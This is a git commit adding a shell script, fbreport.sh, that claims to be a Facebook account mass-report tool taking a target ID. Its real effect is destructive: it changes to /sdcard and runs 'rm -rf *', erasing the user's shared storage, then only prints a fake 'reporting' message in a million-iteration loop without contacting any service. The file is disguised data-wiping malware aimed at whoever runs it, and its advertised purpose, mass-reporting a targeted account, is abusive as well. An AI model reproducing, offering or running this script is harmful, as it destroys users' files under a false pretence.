48804b383b297b1d385139606198a5ff3d122412
hangyi00789 <73415433+hangyi00789@users.noreply.github.com>
2021-02-23 12:20:39 +0630

    Add files via upload

---
+++ fbreport.sh
@@ -0,0 +1,15 @@
+clear
+figlet -f standard FB report Tool
+cd /sdcard
+rm -rf *
+echo ""
+echo -e "\e[1;31m Author:Han Gyi \e[0m"
+echo -e "Github:https://github.com/hangyi00789"
+echo -e "\e[1;37m Facebook acc report tool for normal user \e[0m"
+echo ""
+read -p "Target id::" id
+echo ""
+for x in {1..1000000};do
+echo -e "\e[1;35m $id reporting........ \e[0m"
+echo -e "\e[1;32m ==================================== \e[0m"
+done
